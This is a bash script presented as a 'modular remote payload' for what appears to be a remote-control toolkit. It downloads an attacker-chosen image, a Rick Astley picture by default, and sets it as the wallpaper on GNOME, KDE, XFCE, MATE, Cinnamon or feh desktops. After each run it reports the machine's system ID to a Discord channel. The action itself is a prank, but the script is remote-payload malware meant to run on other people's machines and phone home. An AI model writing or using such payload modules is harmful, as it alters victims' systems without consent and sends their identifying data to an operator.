#!/bin/bash
# ============================================================
# Wallpaper Changer for Linux - Modular Remote Payload
# ============================================================

SYSID=$(get_sysid)

# Default image (Rick Astley)
IMAGE_URL="${U:-https://i.imgur.com/LMGqCLV.jpeg}"
WALLPAPER="/tmp/wallpaper_$(date +%s).jpg"

# Download image
curl -sL "$IMAGE_URL" -o "$WALLPAPER"

if [[ ! -f "$WALLPAPER" ]]; then
    send_discord "❌ Wallpaper download failed on $SYSID"
    exit 1
fi

# Detect desktop environment and set wallpaper
DESKTOP="${XDG_CURRENT_DESKTOP:-$DESKTOP_SESSION}"

case "$DESKTOP" in
    *GNOME*|*Unity*|*Budgie*)
        gsettings set org.gnome.desktop.background picture-uri "file://$WALLPAPER"
        gsettings set org.gnome.desktop.background picture-uri-dark "file://$WALLPAPER"
        ;;
    *KDE*|*Plasma*)
        # KDE requires dbus
        qdbus org.kde.plasmashell /PlasmaShell org.kde.PlasmaShell.evaluateScript "
            var allDesktops = desktops();
            for (i=0;i<allDesktops.length;i++) {
                d = allDesktops[i];
                d.wallpaperPlugin = 'org.kde.image';
                d.currentConfigGroup = Array('Wallpaper', 'org.kde.image', 'General');
                d.writeConfig('Image', 'file://$WALLPAPER')
            }
        " 2>/dev/null
        ;;
    *XFCE*|*Xfce*)
        xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitor0/workspace0/last-image -s "$WALLPAPER"
        ;;
    *MATE*)
        gsettings set org.mate.background picture-filename "$WALLPAPER"
        ;;
    *Cinnamon*)
        gsettings set org.cinnamon.desktop.background picture-uri "file://$WALLPAPER"
        ;;
    *)
        # Try feh as fallback
        if command -v feh &>/dev/null; then
            feh --bg-scale "$WALLPAPER"
        fi
        ;;
esac

send_discord "🖼️ **Wallpaper Changed on $SYSID**"

